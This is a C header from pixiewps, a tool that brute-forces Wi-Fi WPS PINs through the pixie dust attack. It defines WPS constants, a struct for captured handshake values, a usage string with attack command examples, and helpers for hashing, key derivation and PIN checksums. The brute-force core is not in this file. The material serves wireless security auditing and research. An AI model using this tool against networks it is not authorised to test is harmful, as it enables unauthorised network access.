/*
 * pixiewps: bruteforce the wps pin exploiting the low or non-existing entropy of some APs (pixie dust attack).
 *           All credits for the research go to Dominique Bongard.
 *
 * Special thanks to: datahead, soxrok2212
 *
 * Copyright (c) 2015, wiire <wi7ire@gmail.com>
 * Version: 1.1
 *
 * DISCLAIMER: This tool was made for educational purposes only.
 *             The author is NOT responsible for any misuse or abuse.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 *
 * In addition, as a special exception, the copyright holders give
 * permission to link the code of portions of this program with the
 * OpenSSL library under certain conditions as described in each
 * individual source file, and distribute linked combinations
 * including the two.
 * You must obey the GNU General Public License in all respects
 * for all of the code used other than OpenSSL.  If you modify
 * file(s) with this exception, you may extend this exception to your
 * version of the file(s), but you are not obligated to do so.  If you
 * do not wish to do so, delete this exception statement from your
 * version.  If you delete this exception statement from all source
 * files in the program, then also delete it here.
 */

#ifndef _PIXIEWPS_H
#define _PIXIEWPS_H

#define VERSION           "1.1"
#define MAX_MODE              4
#define MODE4_DAYS           10
#define SEC_PER_HOUR       3600
#define SEC_PER_DAY       86400

/* WPS constants */
#define WPS_PUBKEY_LEN      192
#define WPS_HASH_LEN         32
#define WPS_AUTHKEY_LEN      32
#define WPS_EMSK_LEN         32
#define WPS_KEYWRAPKEY_LEN   16
#define WPS_NONCE_LEN        16
#define WPS_SECRET_NONCE_LEN 16
#define WPS_PSK_LEN          16
#define WPS_BSSID_LEN         6
#define WPS_KDF_SALT_LEN     36

/* Exit costants */
#define PIN_ERROR             2
#define MEM_ERROR             3
#define ARG_ERROR             4

#include <openssl/sha.h>
#include <openssl/hmac.h>

typedef enum {false = 0, true = 1} bool;

struct global {
	unsigned char *pke;
	unsigned char *pkr;
	unsigned char *e_hash1;
	unsigned char *e_hash2;
	unsigned char *authkey;
	unsigned char *e_nonce;
	unsigned char *r_nonce;
	unsigned char *psk1;
	unsigned char *psk2;
	unsigned char *dhkey;
	unsigned char *kdk;
	unsigned char *wrapkey;
	unsigned char *emsk;
	unsigned char *e_s1;
	unsigned char *e_s2;
	unsigned char *e_bssid;
	bool small_dh_keys;
	bool bruteforce;
	int verbosity;
	char *error;
};

char usage[] =
	"\n"
	" Pixiewps %s WPS pixie dust attack tool\n"
	" Copyright (c) 2015, wiire <wi7ire@gmail.com>\n"
	"\n"
	" Usage: %s <arguments>\n"
	"\n"
	" Required Arguments:\n"
	"\n"
	"    -e, --pke           : Enrollee public key\n"
	"    -r, --pkr           : Registrar public key\n"
	"    -s, --e-hash1       : Enrollee Hash1\n"
	"    -z, --e-hash2       : Enrollee Hash2\n"
	"    -a, --authkey       : Authentication session key\n"
	"\n"
	" Optional Arguments:\n"
	"\n"
	"    -n, --e-nonce       : Enrollee nonce (mode 2,3,4)\n"
	"    -m, --r-nonce       : Registrar nonce\n"
        "    -b, --e-bssid       : Enrollee BSSID\n"
	"    -S, --dh-small      : Small Diffie-Hellman keys (PKr not needed)   [No]\n"
	"    -f, --force         : Bruteforce the whole keyspace (mode 4)       [No]\n"
	"    -v, --verbosity     : Verbosity level 1-3, 1 is quietest            [2]\n"
	"\n"
	"    -h, --help          : Display this usage screen\n"
	"\n"
	" Examples:\n"
	"\n"
	" pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>\n"
	" pixiewps -e <pke> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce> -S\n"
	" pixiewps -e <pke> -s <e-hash1> -z <e-hash2> -n <e-nonce> -m <r-nonce> -b <e-bssid> -S\n"
	"%s";

/* SHA-256 */
void sha256(const unsigned char *data, size_t data_len, unsigned char *digest) {
	SHA256_CTX ctx;
	SHA256_Init(&ctx);
	SHA256_Update(&ctx, data, data_len);
	SHA256_Final(digest, &ctx);
}

/* HMAC-SHA-256 */
void hmac_sha256(const void *key, int key_len, const unsigned char *data, size_t data_len, unsigned char *digest) {
	unsigned int h_len = WPS_HASH_LEN;
	HMAC_CTX ctx;
	HMAC_CTX_init(&ctx);
	HMAC_Init_ex(&ctx, key, key_len, EVP_sha256(), 0);
	HMAC_Update(&ctx, data, data_len);
	HMAC_Final(&ctx, digest, &h_len);
	HMAC_CTX_cleanup(&ctx);
}

/* Key Derivation Function */
void kdf(unsigned char *key, size_t key_len, unsigned char *res) {
	uint32_t i = 1;
	uint32_t kdk_len = key_len * 8;
	int j = 0;

	/* Wi-Fi Easy and Secure Key Derivation */
	char *salt = "\x57\x69\x2d\x46\x69\x20\x45\x61\x73\x79\x20\x61\x6e\x64\x20\x53\x65\x63\x75\x72\x65\x20\x4b\x65\x79\x20\x44\x65\x72\x69\x76\x61\x74\x69\x6f\x6e";

	unsigned char *buffer = malloc(WPS_KDF_SALT_LEN + 4 * 2);

	for (i = 1; i < 4; i++) {
		uint32_t be = __be32_to_cpu(i);
		memcpy(buffer, &be, 4);
		memcpy(buffer + 4, salt, WPS_KDF_SALT_LEN);
		be = __be32_to_cpu(kdk_len);
		memcpy(buffer + 4 + 36, &be, 4);
		hmac_sha256(key, WPS_HASH_LEN, buffer, WPS_KDF_SALT_LEN + 4 * 2, res + j);
		j += WPS_HASH_LEN;
	}
	free(buffer);
}

/* Pin checksum computing */
unsigned int wps_pin_checksum(unsigned int pin) {
	unsigned int acc = 0;
	while (pin) {
		acc += 3 * (pin % 10);
		pin /= 10;
		acc += pin % 10;
		pin /= 10;
	}
	return (10 - acc % 10) % 10;
}

/* Validity PIN control based on checksum */
unsigned int wps_pin_valid(unsigned int pin) {
	return wps_pin_checksum(pin / 10) == (pin % 10);
}

#endif /* _PIXIEWPS_H */
